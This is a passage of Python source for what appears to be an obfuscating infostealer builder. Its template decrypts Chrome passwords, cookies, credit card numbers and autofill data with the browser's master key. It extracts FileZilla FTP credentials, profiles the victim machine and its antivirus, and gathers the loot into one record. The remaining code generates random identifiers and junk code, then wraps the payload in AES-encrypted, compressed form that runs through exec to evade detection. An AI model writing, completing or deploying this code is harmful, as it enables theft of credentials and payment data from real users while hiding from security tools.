                                        {tempVarForUseInFunc19} = self.{ChromeStealarClassGetMasterKeyFuncName}({tempVarForUseInFunc3}+os.sep+"Local State")
                                        {tempVarForUseInFunc16} = self.{ChromeStealarClassDecryptPassorFuncName}({tempVarForUseInFunc15}, {tempVarForUseInFunc19})
                                    else:
                                        {tempVarForUseInFunc16} = {tempVarForUseInFunc18}
                                    {tempVarForUseInFunc17} = {{
                                        "host_key": {tempVarForUseInFunc13},
                                        "name": {tempVarForUseInFunc14},
                                        "value": {tempVarForUseInFunc16}
                                    }}
                                    self.{ChromeStealerClassNameCookie}.append({tempVarForUseInFunc17})
                        except Exception as e:
                            pass
                        {tempVarForUseInFunc10}.close()
                        {tempVarForUseInFunc11}.close()
                        try:
                            os.remove({tempVarForUseInFunc8} + ".db")
                        except Exception as e:
                            pass
  # {randomComment3}  
                        try:
                            {tempVarForUseInFunc11} = sqlite3.connect({tempVarForUseInFunc7} + ".db")
                            {tempVarForUseInFunc10} = {tempVarForUseInFunc11}.cursor()
                            {tempVarForUseInFunc10}.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                            for {tempVarForUseInFunc12} in {tempVarForUseInFunc10}.fetchall():
                                    {tempVarForUseInFunc13} = {tempVarForUseInFunc12}[0]
                                    {tempVarForUseInFunc14} = {tempVarForUseInFunc12}[1]
                                    {tempVarForUseInFunc15} = {tempVarForUseInFunc12}[2]
                                    {tempVarForUseInFunc16} = {tempVarForUseInFunc12}[3]
                                    {tempVarForUseInFunc18} = self.{ChromeStealarClassGetMasterKeyFuncName}({tempVarForUseInFunc3} + os.sep + "Local State")
                                    {tempVarForUseInFunc17} = self.{ChromeStealarClassDecryptPassorFuncName}({tempVarForUseInFunc16}, {tempVarForUseInFunc18})
                                    {tempVarForUseInFunc19} = {{
                                        "name_on_card": {tempVarForUseInFunc13},
                                        "expiration_month": {tempVarForUseInFunc14},
                                        "expiration_year": {tempVarForUseInFunc15},
                                        "card_number": {tempVarForUseInFunc17}
                                    }}
                                    self.{ChromeStealerClassNameCreditC}.append({tempVarForUseInFunc19})
                            {tempVarForUseInFunc10}.execute("SELECT action_url, username_value, password_value FROM autofill")
                            for {tempVarForUseInFunc12} in {tempVarForUseInFunc10}.fetchall():
                                {tempVarForUseInFunc13} = {tempVarForUseInFunc12}[0]
                                {tempVarForUseInFunc14} = {tempVarForUseInFunc12}[1]
                                {tempVarForUseInFunc15} = {tempVarForUseInFunc12}[2]
                                {tempVarForUseInFunc17} = self.{ChromeStealarClassGetMasterKeyFuncName}({tempVarForUseInFunc3} + os.sep + "Local State")
                                {tempVarForUseInFunc16} = self.{ChromeStealarClassDecryptPassorFuncName}({tempVarForUseInFunc15}, {tempVarForUseInFunc17})
                                if len({tempVarForUseInFunc14}) > 0:
                                    {tempVarForUseInFunc18} = {{
                                            "url": {tempVarForUseInFunc13},
                                            "username": {tempVarForUseInFunc14},
                                            "password": {tempVarForUseInFunc16}
                                        }}
                                self.{ChromeStealerClassNamePassword}.append({tempVarForUseInFunc18})
                        # {randomComment3}        
                            {tempVarForUseInFunc10}.execute("SELECT origin_url, username_value, password_value FROM logins")
                            for {tempVarForUseInFunc12} in {tempVarForUseInFunc10}.fetchall():
                                {tempVarForUseInFunc13} = {tempVarForUseInFunc12}[0]
                                {tempVarForUseInFunc14} = {tempVarForUseInFunc12}[1]
                                {tempVarForUseInFunc15} = {tempVarForUseInFunc12}[2]
                                {tempVarForUseInFunc17} = self.{ChromeStealarClassGetMasterKeyFuncName}({tempVarForUseInFunc3} + os.sep + "Local State")
                                {tempVarForUseInFunc16} = self.{ChromeStealarClassDecryptPassorFuncName}({tempVarForUseInFunc15}, {tempVarForUseInFunc17})
                                if len(username) > 0:
                                    {tempVarForUseInFunc18} = {{
                                            "url": {tempVarForUseInFunc13},
                                            "username": {tempVarForUseInFunc14},
                                            "password": {tempVarForUseInFunc16}
                                        }}
                                self.{ChromeStealerClassNamePassword}.append({tempVarForUseInFunc18})
  # {randomComment1}  
  # {randomComment3}  
                        except Exception as e:
                            pass
                        {tempVarForUseInFunc10}.close()
                        {tempVarForUseInFunc11}.close()
                        try:
                            os.remove({tempVarForUseInFunc7} + ".db")
                        except Exception as e:
                            pass
     # {randomComment3}                       
    def {ChromeStealarClassPayloadFuncName}(self, {tempVarForUseInFunc}, {tempVarForUseInFunc2}):
        return {tempVarForUseInFunc}.decrypt({tempVarForUseInFunc2})

    def {ChromeStealarClassGenerateCyperFuncName}(self, {tempVarForUseInFunc}, {tempVarForUseInFunc2}):
        return AES.new({tempVarForUseInFunc}, AES.MODE_GCM, {tempVarForUseInFunc2})
  # {randomComment3}  
    def {ChromeStealarClassDecryptPassorFuncName}(self, {tempVarForUseInFunc2}, {tempVarForUseInFunc3}):
        try:
            {tempVarForUseInFunc} = {tempVarForUseInFunc2}[3:15]
            {tempVarForUseInFunc4} = {tempVarForUseInFunc2}[15:]
            {tempVarForUseInFunc5} = self.{ChromeStealarClassGenerateCyperFuncName}({tempVarForUseInFunc3}, {tempVarForUseInFunc})
            {tempVarForUseInFunc6} = self.{ChromeStealarClassPayloadFuncName}({tempVarForUseInFunc5}, {tempVarForUseInFunc4})
            {tempVarForUseInFunc6} = {tempVarForUseInFunc6}[:-16].decode()
            return {tempVarForUseInFunc6}
        except Exception as e:
            return "NIL"
# {randomComment3}
class {FileZilleCLassName}: 
    # {randomComment4}
    def __init__(self):
        self.{FileZilleClassPasswordName} = []
        self.{FilezilleClassgetPasswordFuncname}()
    def {FilezilleClassgetPasswordFuncname}(self):
        {tempVarForUseInFunc} = os.path.join(os.environ["appdata"], "FileZilla")
        {tempVarForUseInFunc} = os.path.join({tempVarForUseInFunc}, "recentservers.xml") 
        if os.path.exists({tempVarForUseInFunc}):
            {tempVarForUseInFunc2} = ET.parse({tempVarForUseInFunc})
            {tempVarForUseInFunc3} = {tempVarForUseInFunc2}.getroot()
            for {tempVarForUseInFunc4} in {tempVarForUseInFunc3}.findall("./RecentServers/Server"):
                {tempVarForUseInFunc5} = {tempVarForUseInFunc4}.find("Host").text
                {tempVarForUseInFunc6} = {tempVarForUseInFunc4}.find("Port").text
                {tempVarForUseInFunc7} = {tempVarForUseInFunc4}.find("User").text
                {tempVarForUseInFunc8} = {tempVarForUseInFunc4}.find("Pass").text
                {tempVarForUseInFunc9} = base64.b64decode({tempVarForUseInFunc8}).decode()
    # {randomComment4}
                {tempVarForUseInFunc10} = {{
                    "host": {tempVarForUseInFunc5},
                    "port": {tempVarForUseInFunc6},
                    "user": {tempVarForUseInFunc7},
                    "password": {tempVarForUseInFunc9},
                }}
                self.{FileZilleClassPasswordName}.append({tempVarForUseInFunc10})

{tempVarForUseInFunc} = {PCInfoClass}()
{tempVarForUseInFunc2} = {SoftwareInfoClass}()

{tempVarForUseInFunc3} = {ChromeStealarClassName}()
{tempVarForUseInFunc4} = {FileZilleCLassName}()


{tempVarForUseInFunc10} = {{    
        "PC Name": {tempVarForUseInFunc}.{PCInfoClass_USERNAME},
        "PC IP": {tempVarForUseInFunc}.{PCInfoClass_IP},
        "MAC Address": {tempVarForUseInFunc}.{PCInfoMac},
        "Location":{tempVarForUseInFunc}.{PCInfoLocation},
        "IP Log Date": {tempVarForUseInFunc}.{PCInfoClass_RUN_DATE},
        "HWID": {tempVarForUseInFunc}.{PCInfoHwid},
        "Disk": {tempVarForUseInFunc}.{PCInfoClass_DISK},
        "CPU": {tempVarForUseInFunc}.{PCInfoClass_CPU},
        "GPU": {tempVarForUseInFunc}.{PCInfoClass_GPU},
        "RAM": {tempVarForUseInFunc}.{PCInfoClass_RAM},
        "OS": {tempVarForUseInFunc}.{PCInfoClass_OS_VERSION},
        "Installed Browsers": ({tempVarForUseInFunc2}.{SoftwareInfoDecetedAllBrowserFuncName}()),
        "Installed Antivirus": ({tempVarForUseInFunc2}.{SoftwareInfoDecetedAllAntivursFuncName}()),
        "Installed Software": ({tempVarForUseInFunc2}.{SoftwareInfoReturnAllSoftwareFuncName}()),
    }}

if {tempVarForUseInFunc4}.{FileZilleClassPasswordName}:
    {tempVarForUseInFunc10}["FTP"] = {tempVarForUseInFunc4}.{FileZilleClassPasswordName}

if {tempVarForUseInFunc3}.{ChromeStealerClassNameCreditC}:
    {tempVarForUseInFunc10}["Credit Cards"] = {tempVarForUseInFunc3}.{ChromeStealerClassNameCreditC}

if {tempVarForUseInFunc3}.{ChromeStealerClassNamePassword}:
    {tempVarForUseInFunc10}["Passwords"] = {tempVarForUseInFunc3}.{ChromeStealerClassNamePassword}

#if {tempVarForUseInFunc}.{PCInfoFiles}:
#    {tempVarForUseInFunc10}["Important Files"] = {tempVarForUseInFunc}.{PCInfoFiles}

if {tempVarForUseInFunc3}.{ChromeStealerClassNameCookie}:
    {tempVarForUseInFunc10}["Cookies"] = {tempVarForUseInFunc3}.{ChromeStealerClassNameCookie}

if {tempVarForUseInFunc3}.{ChromeStealerClassNameHistory}:
    {tempVarForUseInFunc10}["History"] = {tempVarForUseInFunc3}.{ChromeStealerClassNameHistory}


# {randomComment3}
        """).format(
            PCInfoClass=PCInfoClass,
            PCInfoClass_IP=PCInfoClass_IP,
            PCInfoClass_CPU=PCInfoClass_CPU,
            PCInfoClass_GPU=PCInfoClass_GPU,
            PCInfoClass_RAM=PCInfoClass_RAM,
            PCInfoClass_DISK=PCInfoClass_DISK,
            PCInfoClass_USERNAME=PCInfoClass_USERNAME,
            PCInfoClass_OS_VERSION=PCInfoClass_OS_VERSION,
            PCInfoClass_RUN_DATE=PCInfoClass_RUN_DATE,
            randomComment1=randomComment1,
            randomComment2=randomComment2,
            PCInfoMac=PCInfoMac,
            PCInfoTempMac=PCInfoTempMac,
            randomComment3=randomComment3,
            randomComment4=randomComment4,
            PCInfoTempLocation=PCInfoTempLocation,
            PCInfoLocation=PCInfoLocation,
            PCInfoFiles=PCInfoFiles,
            PCInfoHwid=PCInfoHwid,
            PCInfoFilesFuncName=PCInfoFilesFuncName,
            PCInfoFilesFuncNameImportantFiles=PCInfoFilesFuncNameImportantFiles,
            PCInfoFilesFuncNameDirs=PCInfoFilesFuncNameDirs,
            PCInfoFilesFuncRoot=PCInfoFilesFuncRoot,
            PCInfoFilesFuncFiles=PCInfoFilesFuncFiles,
            PCInfoFilesFuncFile=PCInfoFilesFuncFile,
            PCInfoFilesFuncExt=PCInfoFilesFuncExt,
            PCInfoFilesFuncExts=PCInfoFilesFuncExts,
            PCInfoFilesFuncDirectory=PCInfoFilesFuncDirectory,
            PCInfoFilesFuncReader=PCInfoFilesFuncReader,
            PCInfoFilesFuncReadData=PCInfoFilesFuncReadData,
            PCInfoFilesFuncReadDataEncoded=PCInfoFilesFuncReadDataEncoded,
            PCInfoGetHwidFuncName=PCInfoGetHwidFuncName,
            PCInfoGetHwidWName=PCInfoGetHwidWName,
            PCInfoGetHwidTempName=PCInfoGetHwidTempName,
            PCInfoGetHwidDiskName=PCInfoGetHwidDiskName,
            PCInfoGetCPUInfoFuncName=PCInfoGetCPUInfoFuncName,
            PCInfoGetDiskInfoFuncName=PCInfoGetDiskInfoFuncName,
            PCInfoGetDiskInfoFuncName2=PCInfoGetDiskInfoFuncName2,
            PCInfoGetUsernameFuncName=PCInfoGetUsernameFuncName,
            PCInfoGetGpuInfoFuncName=PCInfoGetGpuInfoFuncName,
            tempVarForUseInFunc=tempVarForUseInFunc,
            tempVarForUseInFunc2=tempVarForUseInFunc2,
            tempVarForUseInFunc3=tempVarForUseInFunc3,
            tempVarForUseInFunc4=tempVarForUseInFunc4,
            tempVarForUseInFunc5=tempVarForUseInFunc5,
            tempVarForUseInFunc6=tempVarForUseInFunc6,
            tempVarForUseInFunc7=tempVarForUseInFunc7,
            tempVarForUseInFunc8=tempVarForUseInFunc8,
            tempVarForUseInFunc9=tempVarForUseInFunc9,
            tempVarForUseInFunc10=tempVarForUseInFunc10,
            SoftwareInfoClass=SoftwareInfoClass,
            SoftwareInfoClassSelfSoftwareList=SoftwareInfoClassSelfSoftwareList,
            SoftwareInfoClassFoo=SoftwareInfoClassFoo,
            SoftwareInfoClassGetSoftwareListFuncName=SoftwareInfoClassGetSoftwareListFuncName,
            SoftwareInfoClassGetBrowserFuncName=SoftwareInfoClassGetBrowserFuncName,
            SoftwareInfoClassGetAntiVirusFuncName=SoftwareInfoClassGetAntiVirusFuncName,
            SoftwareInfoReturnAllSoftwareFuncName=SoftwareInfoReturnAllSoftwareFuncName,

            SoftwareInfoDecetedAllBrowserFuncName=SoftwareInfoDecetedAllBrowserFuncName,
            SoftwareInfoDecetedAllAntivursFuncName=SoftwareInfoDecetedAllAntivursFuncName,
            tempVarForUseInFunc11=tempVarForUseInFunc11,
            tempVarForUseInFunc12=tempVarForUseInFunc12,
            tempVarForUseInFunc13=tempVarForUseInFunc13,
            tempVarForUseInFunc14=tempVarForUseInFunc14,
            tempVarForUseInFunc15=tempVarForUseInFunc15,
            tempVarForUseInFunc16=tempVarForUseInFunc16,
            tempVarForUseInFunc17=tempVarForUseInFunc17,
            tempVarForUseInFunc18=tempVarForUseInFunc18,
            tempVarForUseInFunc19=tempVarForUseInFunc19,
            tempVarForUseInFunc20=tempVarForUseInFunc20,
            tempVarForUseInFunc21=tempVarForUseInFunc21,

            ChromeStealarClassName=ChromeStealarClassName,
            ChromeStealerClassNamePassword=ChromeStealerClassNamePassword,
            ChromeStealerClassNameHistory=ChromeStealerClassNameHistory,
            ChromeStealerClassNameCookie=ChromeStealerClassNameCookie,
            ChromeStealerClassNameCreditC=ChromeStealerClassNameCreditC,
            ChromeStealarClassStartChromeFuncName=ChromeStealarClassStartChromeFuncName,
            ChromeStealarClassGetMasterKeyFuncName=ChromeStealarClassGetMasterKeyFuncName,
            ChromeStealarClassDecryptPassorFuncName=ChromeStealarClassDecryptPassorFuncName,
            ChromeStealarClassGenerateCyperFuncName=ChromeStealarClassGenerateCyperFuncName,
            ChromeStealarClassPayloadFuncName=ChromeStealarClassPayloadFuncName,

            FileZilleCLassName=FileZilleCLassName,
            FileZilleClassPasswordName=FileZilleClassPasswordName,
            FilezilleClassgetPasswordFuncname=FilezilleClassgetPasswordFuncname,



            

        )
        return code_block

    def getUniqFunctionOrVarName(self,rand1=75,rand2=500,word=False):
        seaChars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

        seaWords="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        arabicChars="ابتثجحخدذرزسشصضطظعغفقكلمنهوي"
        grekChars="αβγδεζηθικλμνξοπρστυφχψω"
        chineeseChars="你好"
        japaneeseChars="こんにちは"
        seaWords=seaWords+arabicChars+grekChars+chineeseChars+japaneeseChars

        seaNums="0123456789"
        seaAll=seaChars+seaNums
        seaBeginBytes=[
            "_x_",
            "_X_",
            "_x86_",
            "_x64_",
            "_x32_",
            "_x86_64_",
            "_x86_32_",
            "_x64_32_",
            "_x64_64_",
            "_x32_32_",
            "_x32_64_",

            "_X86_",
            "_X64_",
            "_X32_",
            "_X86_64_",
            "_X86_32_",
            "_X64_32_",
            "_X64_64_",
            "_X32_32_",
            "_X32_64_", 
        ]
        varLength=random.randint(rand1,rand2)
        varName=""
        size=0

        for i in range(varLength):
            if word:
                lowerCase=random.choice(seaWords)
                lowerCase=lowerCase.lower()
                varName+=lowerCase
            else:
                varName+=random.choice(seaAll)
            size+=1
            if word and size%random.randint(4,8)==0:
                varName+=" "
            if not word and size%random.randint(2,4)==0:
                varName+="_"
        if varName[0] in seaNums:
            varName=random.choice(seaChars)+varName
        varName=random.choice(seaBeginBytes)+random.choice(seaChars)+random.choice(seaNums)+"_"+varName
        return varName
 
    def cryptoFinal(self, data):
        
        key = get_random_bytes(32)
        iv = get_random_bytes(16)

        compressed_data = zlib.compress(data.encode('utf-8'), level=9)

        base64_data = base64.b64encode(compressed_data)
        padded_data = pad(base64_data, AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        cipher_text = cipher.encrypt(padded_data)

        tempVarForUseInFunc=self.getUniqFunctionOrVarName(15500,20000)
        tempVarForUseInFunc2=self.getUniqFunctionOrVarName(15500,20000)
        tempVarForUseInFunc3=self.getUniqFunctionOrVarName(15500,20000)
        tempVarForUseInFunc4=self.getUniqFunctionOrVarName(15500,20000)
        tempVarForUseInFunc5=self.getUniqFunctionOrVarName(15500,20000)
        tempVarForUseInFunc6=self.getUniqFunctionOrVarName(15500,20000)
        tempVarForUseInFunc7=self.getUniqFunctionOrVarName(15500,20000)
        tempVarForUseInFunc8=self.getUniqFunctionOrVarName(15500,20000)
        tempVarForUseInFunc9=self.getUniqFunctionOrVarName(15500,20000)
        tempVarForUseInFunc10=self.getUniqFunctionOrVarName(15500,20000)

        randomComment1=self.getUniqFunctionOrVarName(15500,20000,word=True)
        randomComment2=self.getUniqFunctionOrVarName(15500,20000,word=True)
        randomComment3=self.getUniqFunctionOrVarName(15500,20000,word=True)
        randomComment4=self.getUniqFunctionOrVarName(15500,20000,word=True)
        randomComment5=self.getUniqFunctionOrVarName(15500,20000,word=True)
        junk1=self.JunkGen()
        junk2=self.JunkGen()
        junk3=self.JunkGen()
        junk4=self.JunkGen()
        junk5=self.JunkGen()
        junk6=self.JunkGen()
        junk7=self.JunkGen()
        junk8=self.JunkGen()
        junk9=self.JunkGen()
        junk10=self.JunkGen()



        code_block = textwrap.dedent(
            """
            # {randomComment1}
            {junk1}
            {tempVarForUseInFunc} = {key}
            {junk2}
            # {randomComment2}
            {tempVarForUseInFunc2} = {iv}
            {junk3}
            # {randomComment2}
            {tempVarForUseInFunc3} = AES.new({tempVarForUseInFunc}, AES.MODE_CBC, {tempVarForUseInFunc2})
            {junk4}
            # {randomComment3}
            {tempVarForUseInFunc4} = {cipher_text}
            {junk5}
            # {randomComment4}
            {tempVarForUseInFunc5} = {tempVarForUseInFunc3}.decrypt({tempVarForUseInFunc4})
            {junk6}
            #  {randomComment5}
            {tempVarForUseInFunc6} = unpad({tempVarForUseInFunc5}, AES.block_size)
            {junk7}
            # {randomComment1}
            {tempVarForUseInFunc7} = base64.b64decode({tempVarForUseInFunc6})
            {junk8}
            # {randomComment2}
            {tempVarForUseInFunc8} = zlib.decompress({tempVarForUseInFunc7}).decode('utf-8')
            {junk9}
            # {randomComment3}
            {junk1}
            {junk2}
            {junk3}
            {junk4}
            {junk5}
            {junk6}
            {junk7}
            {junk8}
            {junk9}
            exec({tempVarForUseInFunc8})
            # {randomComment4}
            # {randomComment5}
            # {randomComment1}
            # {randomComment2}
            # {randomComment3}
            # {randomComment4}
            # {randomComment5}
            # {randomComment1}
            # {randomComment2}
            # {randomComment3}
            # {randomComment4}
            # {randomComment5}
            """
        ).format(
            key=key,
            iv=iv,
            cipher_text=cipher_text,
            padded_data=padded_data,
            base64_data=base64_data,
            compressed_data=compressed_data,
            data=data,
            tempVarForUseInFunc=tempVarForUseInFunc,
            tempVarForUseInFunc2=tempVarForUseInFunc2,
            tempVarForUseInFunc3=tempVarForUseInFunc3,
            tempVarForUseInFunc4=tempVarForUseInFunc4,
            tempVarForUseInFunc5=tempVarForUseInFunc5,
            tempVarForUseInFunc6=tempVarForUseInFunc6,
            tempVarForUseInFunc7=tempVarForUseInFunc7,
            tempVarForUseInFunc8=tempVarForUseInFunc8,
            tempVarForUseInFunc9=tempVarForUseInFunc9,
            tempVarForUseInFunc10=tempVarForUseInFunc10,
            randomComment1=randomComment1,
            randomComment2=randomComment2,
            randomComment3=randomComment3,
            randomComment4=randomComment4,
            randomComment5=randomComment5,
            junk1=junk1,
            junk2=junk2,
            junk3=junk3,
            junk4=junk4,
            junk5=junk5,
            junk6=junk6,
            junk7=junk7,
            junk8=junk8,
            junk9=junk9,
            junk10=junk10,
        )
        return code_block


